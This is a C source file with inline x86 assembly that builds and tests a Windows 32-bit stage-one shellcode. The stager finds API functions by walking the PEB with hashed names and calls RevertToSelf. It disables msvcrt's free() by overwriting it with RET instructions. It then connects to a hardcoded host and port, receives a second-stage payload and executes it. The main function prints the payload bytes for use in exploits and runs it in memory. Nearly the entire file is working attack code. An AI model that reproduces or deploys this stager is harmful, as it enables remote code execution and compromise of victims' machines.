#include <stdio.h>
#include <malloc.h>
#include <string.h>
#include <windows.h>
#include <stdlib.h>


/* 
	Note also 32 bit environment
*/


int make_executable(unsigned int addr){
	//Note we should call this function not from stack section, but .text section. like normal call
	// local variables 
	unsigned int *good;
	int ret;
	int addr_clean = 0xffffe000 & addr;
	LPVOID lpAddress = (LPVOID) addr_clean;
	DWORD dwSize = 0x2000; 
	DWORD flNewProtect = 0x40; 
	PDWORD lpfOldProtect = (PDWORD)&good; 
	
	ret = VirtualProtect(lpAddress, dwSize,PAGE_EXECUTE_READWRITE, lpfOldProtect); 
	
	// if we failed ... 
	if(ret == 0x0){
		fprintf(stderr,"VirtualAlloc failed on %x with %ld\n", addr_clean, GetLastError());
		return 1;
	}
	// we succeeded 
	fprintf(stdout,"Now %x is executable\n", addr_clean);
	return 0;
}

__attribute__((fastcall)) void getprocaddr(void)
{
	// change ip and port from here
	asm("\n\
	 //first 2 bytes are the PORT (then AF_INET is 0002)\n\
	 .set PORTPROT, 0x5c110002\n\
	 //server ip is 192.168.89.1\n\
	 //.set IPADDR, 0x0159a8c0\n\
	 .set IPADDR, 0x0100007f\n\
	");
	
	asm("\n\
		.set KERNEL32HASH, 0x000d4e88\n\
		.set NUMBEROFKERNEL32FUNCTIONS, 0X4\n\
		.set VIRTUALPROTECTHASH, 0x38d13c\n\
		.set GETPROCADDRESSHASH, 0x00348bfa\n\
		.set LOADLIBRARYAHASH, 0x000d5786\n\
		.set GETSYSTEMDIRECTORYAHASH, 0x069bb2e6\n\
		\n\
		.set WS232HASH, 0x0003ab08\n\
		.set NUMBEROFWS232FUNCTIONS, 0x5\n\
		.set CONNECTHASH, 0x0000677c\n\
		.set RECVHASH, 0x00000cc0\n\
		.set SENDHASH, 0x00000cd8\n\
		.set WSASTARTUPHASH, 0x00039314\n\
		.set SOCKETHASH, 0x000036a4\n\
		\n\
		.set MSVCRTHASH, 0x00037908\n\
		.set NUMBEROFMSVCRTFUNCTIONS, 0x1\n\
		.set FREEHASH, 0x00000c4e\n\
		\n\
		.set ADVAPI32HASH, 0x000ca608\n\
		.set NUMBEROFADVAPI32FUNCTIONS, 0x1\n\
		.set REVERTTOSELFHASH, 0x000dcdb4\n\
	");
	
	/*Start of Shellcode*/
	/*Note: ebx will be our base address, all code is PIC*/
	//##1## Entry point
	asm("\n\
	mainentrypoint:\n\
	 call geteip\n\
	\n\
	geteip:\n\
	 pop %ebx\n\
	 movl %ebx, %esp\n\
	 subl $0x1000, %esp\n\
	 and $0xffffff00, %esp\n\
	");
	 
	//##2## GET KERNEL32 FUNCTIONS
	asm("\n\
	 movl $NUMBEROFKERNEL32FUNCTIONS, %ecx \n\
	 lea KERNEL32HASHESTABLE-geteip(%ebx), %esi\n\
	 lea KERNEL32FUNCTIONSTABLE-geteip(%ebx), %edi\n\
	 getkernel32functions:\n\
	 //push the hash we are looking for, which is pointed to by %esi\n\
	 pushl $0\n\
	 pushl (%esi)\n\
	 pushl $KERNEL32HASH\n\
	 call getfuncaddress\n\
	 movl %eax, (%edi)\n\
	 addl $4, %edi\n\
	 addl $4, %esi\n\
	 loop getkernel32functions\n\
	");
	 
	//##3## GET MSVCRT FUNCTIONS
	asm("\n\
	 movl $NUMBEROFMSVCRTFUNCTIONS, %ecx \n\
	 lea MSVCRTHASHESTABLE-geteip(%ebx), %esi\n\
	 lea MSVCRTFUNCTIONSTABLE-geteip(%ebx), %edi\n\
	 getmsvcrtfunctions:\n\
	 //push the hash we are looking for, which is pointed to by %esi\n\
	 pushl $0\n\
	 pushl (%esi)\n\
	 pushl $MSVCRTHASH\n\
	 call getfuncaddress\n\
	 movl %eax, (%edi)\n\
	 addl $4, %edi\n\
	 addl $4, %esi\n\
	 loop getmsvcrtfunctions\n\
	");
	 
	//##4## prevent other thread from free our heap chunck\n\
	//set .code of MSVCRT as rwx and put 0xc3 as first instructions of free(), so RET will return\n\
	//VirtualProtect(\n\
			//LPVOID lpAddress,	// address of region of committed pages \n\
			//DWORD dwSize,	// size of the region \n\
			//DWORD flNewProtect,	// desired access protection \n\
			//PDWORD lpflOldProtect 	// address of variable to get old protection )
	asm("\n\
	 lea BUF-geteip(%ebx), %eax\n\
	 push %eax\n\
	 pushl $0x40\n\
	 pushl $50\n\
	 movl FREE-geteip(%ebx), %edx\n\
	 pushl %edx\n\
	 call *VIRTUALPROTECT-geteip(%ebx)\n\
	 movl FREE-geteip(%ebx), %edx\n\
	 movl $0xc3c3c3c3, (%edx)\n\
	");
	
	//##5## At the end of our shellcode is the string ws2_32.dll. \n\
	//We want to load it (in case it is not already loaded), initialize it, and use it to make a connection to\n\
	//our host, which will be listening on a TCP port.\n\
	//problem: in some environment, we dont go deeper, you cannot load ws2_32.dll unless you call RevertToSelf() first.\n\
	//solution: LoadLibrary ADVAPI.dll and use it to find RevertToSelf function. call it\n\
	//why: we are anonymous user, or something like that, and we want to run the thread as the original process’s user
	
	//##6## GET ADVAPI FUNCTIONS
	asm("\n\
	 lea ADVAPI_32DLL-geteip(%ebx), %esi\n\
	 pushl %ebx\n\
	 pushl %esi\n\
	 call loadlibraryCustom\n\
	 popl %esi\n\
	 popl %ebx\n\
	 \n\
	 movl $NUMBEROFADVAPI32FUNCTIONS, %ecx\n\
	 lea ADVAPI32HASHESTABLE-geteip(%ebx), %esi\n\
	 lea ADVAPI32FUNCTIONSTABLE-geteip(%ebx), %edi\n\
	 getadvapi32functions:\n\
	 //push the hash we are looking for, which is pointed to by %esi\n\
	 pushl $0\n\
	 pushl (%esi)\n\
	 pushl $ADVAPI32HASH\n\
	 call getfuncaddress\n\
	 movl %eax, (%edi)\n\
	 addl $4, %edi\n\
	 addl $4, %esi\n\
	 loop getadvapi32functions\n\
	");

	//##7##  Reddite quae sunt Caesaris Caesari et quae sunt Dei Deo cit.Brian of Nazareth xD
	asm("\n\
	 call *REVERTTOSELF-geteip(%ebx)\n\
	");
	
	//##8##Now that we’re running as the original process’s user, we have permission to read ws2_32.dll
	//problem: some bugs reside on the resolution of dll, so  use complete path to load
	//solution: use the previous function loadlibrarycustom again
	asm("\n\
	 lea WS2_32DLL-geteip(%ebx),%esi\n\
	 pushl %ebx\n\
	 pushl %esi\n\
	 call loadlibraryCustom\n\
	 popl %esi\n\
	 popl %ebx\n\
	 //##9## GET WS2_32 FUNCTIONS\n\
	 movl $NUMBEROFWS232FUNCTIONS,%ecx\n\
	 lea WS232HASHESTABLE-geteip(%ebx),%esi\n\
	 lea WS232FUNCTIONSTABLE-geteip(%ebx),%edi\n\
	 getws232functions:\n\
	 pushl $0\n\
	 pushl (%esi)\n\
	 pushl $WS232HASH\n\
	 call getfuncaddress\n\
	 movl %eax, (%edi )\n\
	 addl $4, %esi\n\
	 addl $4, %edi\n\
	 loop getws232functions\n\
	");
	
	//##10## Now we set up BUFADDR on a quadword boundary ????
	//esp will do since it points far above our current position (OK)
	asm("\n\
	 movl %esp,BUFADDR-geteip(%ebx)\n\
	");
	
	//##11## call WSASTARTUP to get ws2_32.dll rolling
	asm("\n\
	 movl BUFADDR-geteip(%ebx), %eax\n\
	 pushl %eax\n\
	 pushl $0x101\n\
	 call *WSASTARTUP-geteip(%ebx)\n\
	");
	
	//##12## call socket and so open a file descriptor to refer it, as return
	asm("\n\
	 pushl $6\n\
	 pushl $1\n\
	 pushl $2\n\
	 call *SOCKET-geteip(%ebx)\n\
	 movl %eax,FDSPOT-geteip(%ebx)\n\
	");
	 
	//##13## connect
	asm("\n\
	 push $0x10\n\
	 lea SockAddrSPOT-geteip(%ebx), %esi\n\
	 pushl %esi\n\
	 pushl %eax\n\
	 call *CONNECT-geteip(%ebx)\n\
	 test %eax, %eax\n\
	 jl exitthread\n\
	");
	
	//##14## Read size of the real shellcode (max 4 byte so 32int) 
	// care to hton and ntoh
	asm("\n\
	 pushl $4\n\
	 call recvloop\n\
	");
	
	//##15## Read shellcode and save it in buff\n\
	//first dword in BUF is the size of the shellcode to be read next
	asm("\n\
	 movl BUFADDR-geteip(%ebx),%edx\n\
	 movl (%edx),%edx\n\
	 push %edx\n\
	 //read the data into BUF\n\
	 call recvloop\n\
	");
	
	//##16## Execute the second-stage shellcode
	asm("\n\
	 movl BUFADDR-geteip(%ebx),%edx\n\
	 call *%edx\n\
	");
	
	/*Exit thread and call exception */
	asm("\n\
	  exitthread:\n\
	  //just cause an exception..\n\
	  xor %eax, %eax\n\
	  call *%eax\n\
	");
	

/* 
	Utils 
*/
	
	/* GETFUNCADDRESS ROUTINE */
	/* on 32 bit only for now..
    * fs[0x30] is pointer to PEB
		*that + 0c is _PEB_LDR_DATA pointer
		*that + 0c is in load order module list pointer
		Generally, you will follow these steps:
			1. Get the PE header from the current module (fs:0x30).
			2. Go to the PE header.
			3. Go to the export table and obtain the value of nBase.
			4. Get arrayOfNames and find the function.
	 
    * on 64 bit
		gs[0x60]  is pointer to PEB
			*that + 0x18 is _PEB_LDR_DATA pointer
      *that + 0x10 is in load order module list pointer
     Generally you will follow these steps:
			1. Get the PE header from the current module (gs:0x60
			2. Go to the PE header
			3. Go to the export table and obtain the value of nBase.
			4. Get arrayOfNames and find the function.
	*/
	asm("//arg[0]=what dll hashed, arg[1]=what function of that dll,also hashed\n\
	 getfuncaddress:\n\
	 pushl %ebp\n\
	 movl %esp, %ebp\n\
	 pushl %ebx\n\
	 pushl %esi\n\
	 pushl %edi\n\
	 pushl %ecx\n\
	 pushl %fs:(0x30)\n\
	 popl %eax\n\
	 NT:\n\
	 movl 0xc(%eax), %eax\n\
	 movl 0xc(%eax), %ecx\n\
	 nextinlist:\n\
	 movl (%ecx), %edx\n\
	 movl 0x30(%ecx), %eax\n\
	 //push unicode increment value\n\
	 //here we are unicode for that we use this..\n\
	 pushl $2\n\
	 //push dll name hash address\n\
	 movl 8(%ebp), %edi\n\
	 pushl %edi\n\
	 //push string address to compare\n\
	 pushl %eax\n\
	 call hashit\n\
	 test %eax, %eax\n\
	 jz foundmodule\n\
	 //otherwise check the next node in the list\n\
	 movl %edx, %ecx\n\
	 jmp nextinlist\n\
	 //Found the module, NOW get the procedure\n\
	 foundmodule:\n\
	 //first get the base address, and remember the structure is ldr_module_data\n\
	 movl 0x18(%ecx), %eax\n\
	 push %eax\n\
	 //get e_lfanew offset, and find is real address, that will contain the nt headers structure\n\
	 movl 0x3c(%eax), %ebx\n\
	 addl %ebx, %eax\n\
	 //PE->export table is what we want, starting at offset 0xf8\n\
	 movl 0x78(%eax), %ebx\n\
	 pop %eax\n\
	 push %eax\n\
	 addl %eax, %ebx\n\
	 \n\
		//this eax is now the Export Directory Table\n\
		//From MS PE-COFF table, 6.3.1 (search for pecoff at MS Site to download)\n\
		//Offset Size Field Description\n\
		// .... some data \n\
		//16 4 Ordinal Base (usually set to one!)\n\
		// ....  some other data\n\
		//24 4 Number of Name pointers (also the number of ordinals)\n\
		//28 4 Export Address Table RVA Address EAT relative to base\n\
		//32 4 Name Pointer Table RVA Addresses (RVA’s) of Names!\n\
		//36 4 Ordinal Table RVA You need the ordinals to get the addresses\n\
	 \n\
	 movl 16(%ebx),%edi\n\
	 //edi is now the ordinal base (if args[2]==1 then we must use it later..)\n\
	 movl 28(%ebx), %ecx\n\
	 //ecx is now the address table..\n\
	 movl 32(%ebx), %edx\n\
	 //edx is the name pointer table \n\
	 movl 36(%ebx), %ebx\n\
	 //ebx is the ordinal table\n\
	 //use eax and get the real virtual addres\n\
	 addl %eax, %ecx\n\
	 addl %eax, %edx\n\
	 addl %eax, %ebx\n\
	 \n\
	 //Now we find the function pointer finaly.\n\
	 find_procedure:\n\
	 movl (%edx), %esi\n\
	 pop %eax\n\
	 push %eax\n\
	 addl %eax, %esi\n\
	 //push the hash increment - we are ascii here...\n\
	 pushl $1\n\
	 pushl 12(%ebp)\n\
	 pushl %esi\n\
	 call hashit\n\
	 test %eax, %eax\n\
	 jz found_procedure\n\
	 add $4, %edx\n\
	 add $2, %ebx\n\
	 jmp find_procedure\n\
	 \n\
	 found_procedure:\n\
	 pop %eax\n\
	 xor %edx, %edx\n\
	 mov (%ebx), %dx\n\
	 push %edi\n\
	 movl 16(%ebp), %edi\n\
	 test %edi, %edi\n\
	 pop %edi\n\
	 jz no_ordinalbase\n\
	 //SymbolRVA = ExportAddressTable[ordinal-OrdinalBase]\n\
	 //substract ordinal base in this case\n\
	 sub %edi,%edx\n\
	 no_ordinalbase:\n\
	 //multiply by sizeof(dword) 4\n\
	 shl $2, %edx \n\
	 //now add the result to the export address table\n\
	 add %edx, %ecx\n\
	 //and in the end the base address\n\
	 add (%ecx), %eax\n\
	 popl %ecx\n\
	 popl %edi\n\
	 popl %esi\n\
	 popl %ebx\n\
	 mov %ebp, %esp\n\
	 pop %ebp\n\
	 ret $12\n\
	");
	 
	/*hashit function args[0]=string to be hashed, args[1]=already hashed string, args[2]=ascii or unicode */
	asm("\n\
		hashit:\n\
		pushl %ebp\n\
		movl %esp, %ebp\n\
		push %ecx\n\
		push %ebx\n\
		push %edx\n\
		xor %ecx, %ecx\n\
		xor %ebx, %ebx\n\
		xor %edx, %edx\n\
		mov 8(%ebp), %eax\n\
		hashloop:\n\
		movb (%eax), %dl\n\
		//convert char to upper case..\n\
		or $0x60, %dl\n\
		add %edx, %ebx\n\
		shl $1, %ebx\n\
		addl 16(%ebp), %eax\n\
		mov (%eax), %cl\n\
		test %cl, %cl\n\
		loopnz hashloop\n\
		xor %eax, %eax\n\
		mov 12(%ebp), %ecx\n\
		cmp %ecx, %ebx\n\
		jz donehash\n\
		inc %eax\n\
		donehash:\n\
		pop %edx\n\
		pop %ebx\n\
		pop %ecx\n\
		mov %ebp, %esp\n\
		pop %ebp\n\
		ret $12\n\
	");
	
	 
	/*LoadLibraryCustom function args[0]=string to be loaded */
	//call getsystemdirectoryA, then prepend to args[0]
	asm("\n\
	 loadlibraryCustom:\n\
	 pushl %ebp\n\
	 movl %esp, %ebp\n\
	 pushl %esi\n\
	 pushl %edx\n\
	 pushl %ebx\n\
	 popl %ebx\n\
	 pushl %ebx\n\
	 \n\
	 pushl $2048\n\
	 lea BUF-geteip(%ebx),%eax\n\
	 pushl %eax\n\
	 call *GETSYSTEMDIRECTORYA-geteip(%ebx)\n\
	 //now BUF is loaded with the current working system directory\n\
	 //we need to append args[0] (e.g: WS2_32.dll)\n\
	 //because of a bug in LoadLibraryA, which won’t find WS2_32.dll if there is a dot in that path\n\
	 lea BUF-geteip(%ebx),%eax\n\
	 findendofsystemroot:\n\
	 cmpb $0,(%eax)\n\
	 je foundendofsystemroot\n\
	 inc %eax\n\
	 jmp findendofsystemroot\n\
	 foundendofsystemroot:\n\
	 //eax is now pointing to the final null of C:\\windows\\system32\n\
	 movl 8(%ebp), %esi\n\
	 strcpyintobuf:\n\
	 movb (%esi), %dl\n\
	 movb %dl,(%eax)\n\
	 test %dl,%dl\n\
	 jz donewithstrcpy\n\
	 inc %esi\n\
	 inc %eax\n\
	 jmp strcpyintobuf\n\
	 donewithstrcpy:\n\
	 // now loadlibrary ( e.g.: loadlibrarya(\"c:\\winnt\\system32\\ws2_32.dll\") )\n\
	 lea BUF-geteip(%ebx),%edx\n\
	 pushl %edx\n\
	 call *LOADLIBRARY-geteip(%ebx)\n\
	 popl %edx\n\
	 \n\
	 popl %ebx\n\
	 popl %edx\n\
	 popl %esi\n\
	 movl %ebp, %esp\n\
	 popl %ebp\n\
	 ret\n\
	");
	 
	/*Recvloop function */
	asm("\n\
	 recvloop:\n\
	 pushl %ebp\n\
	 movl %esp, %ebp\n\
	 push %edx\n\
	 push %edi\n\
	 movl 0x8(%ebp), %edx\n\
	 movl BUFADDR-geteip(%ebx),%edi\n\
	 callrecvloop:\n\
	 //not an argument- but recv() messes up edx! So we save it off here\n\
	 pushl %edx\n\
	 //flags\n\
	 pushl $0\n\
	 //len\n\
	 pushl $1\n\
	 //*buf\n\
	 pushl %edi\n\
	 movl FDSPOT-geteip(%ebx),%eax\n\
	 pushl %eax\n\
	 call *RECV-geteip(%ebx)\n\
	 //prevents getting stuck in an endless loop if the server closes the connection\n\
	 cmp $0xffffffff,%eax\n\
	 je exitthread\n\
	 popl %edx\n\
	 //subtract how many we read\n\
	 sub %eax,%edx\n\
	 //move buffer pointer forward\n\
	 add %eax,%edi\n\
	 //test if we need to exit the function\n\
	 //recv returned 0\n\
	 test %eax,%eax\n\
	 je donewithrecvloop\n\
	 //we read all the data we wanted to read\n\
	 test %edx,%edx\n\
	 je donewithrecvloop\n\
	 jmp callrecvloop\n\
	 donewithrecvloop:\n\
	 //done with recvloop\n\
	 pop %edi\n\
	 pop %edx\n\
	 mov %ebp, %esp\n\
	 pop %ebp\n\
	 ret $0x04\n\
	");
	
	
	/* Align */
	asm("\n\
	 .long 0\n\
	");
	
	/* tail */
	asm("\n\
	 SockAddrSPOT:\n\
	 .long PORTPROT\n\
	 .long IPADDR\n\
	 \n\
	KERNEL32HASHESTABLE:\n\
	 .long GETSYSTEMDIRECTORYAHASH\n\
	 .long VIRTUALPROTECTHASH\n\
	 .long GETPROCADDRESSHASH\n\
	 .long LOADLIBRARYAHASH\n\
	MSVCRTHASHESTABLE:\n\
	 .long FREEHASH\n\
	ADVAPI32HASHESTABLE:\n\
	 .long REVERTTOSELFHASH\n\
	WS232HASHESTABLE:\n\
	 .long CONNECTHASH\n\
	 .long RECVHASH\n\
	 .long SENDHASH\n\
	 .long WSASTARTUPHASH\n\
	 .long SOCKETHASH\n\
	\n\
	WS2_32DLL:\n\
	 .ascii \"\\\\ws2_32.dll\"\n\
	 .long 0x00000000\n\
	ADVAPI_32DLL:\n\
	 .ascii \"\\\\advapi32.dll\"\n\
	 .long 0x00000000\n\
	\n\
	//below this line, Runtime utility, nothing to do with the shellcode\n\
	endsploit:\n\
	MSVCRTFUNCTIONSTABLE:\n\
	 FREE:\n\
		.long 0x00000000\n\
	ADVAPI32FUNCTIONSTABLE:\n\
	 REVERTTOSELF:\n\
		.long 0x00000000\n\
	KERNEL32FUNCTIONSTABLE:\n\
	 GETSYSTEMDIRECTORYA:\n\
		.long 0x00000000\n\
	 VIRTUALPROTECT:\n\
		.long 0x00000000\n\
	 GETPROCADDRA:\n\
		.long 0x00000000\n\
	 LOADLIBRARY:\n\
		.long 0x00000000\n\
	\n\
	//this stores the address of buf+8 mod 8, since we are not guaranteed to be on a word boundary, and we\n\
	//want to be so Win32 api works\n\
	BUFADDR:\n\
		.long 0x00000000\n\
	WS232FUNCTIONSTABLE:\n\
	 CONNECT:\n\
		.long 0x00000000\n\
	 RECV:\n\
		.long 0x00000000\n\
	 SEND:\n\
		.long 0x00000000\n\
	 WSASTARTUP:\n\
		.long 0x00000000\n\
	 SOCKET:\n\
		.long 0x00000000\n\
	\n\
	SIZE:\n\
		.long 0x00000000\n\
	FDSPOT:\n\
		.long 0x00000000\n\
	BUF:\n\
		.long 0x00000000\n\
	");
}


int main()
{

	unsigned char buffer[4000];
	unsigned char * p;
	unsigned char * p2;
	int i;
	int noError=0;
	
	//getprocaddr();
	memcpy(buffer,getprocaddr,2400);
	p = buffer+3;
	p2 = p;
	
	#define DOPRINT
	#ifdef DOPRINT
		//gdb ) printf “%d\n”, endsploit - mainentrypoint -1
		printf("shellcode=\"");
		for (i=0; i<666; i++)
		{
		printf("\\x%2.2x",*p);
		if ((i+1)%8==0)
		printf("\"\nshellcode+=\"");
		p++;
		}
		printf("\"\n");
	#endif
	
	#define MMEX
	#ifdef MMEX
		if( make_executable((unsigned int) p) == 0)
			noError = 1;
	#endif
	
	
	if(noError)
		((void(*)())(p2)) ();
	
	return 0;
}


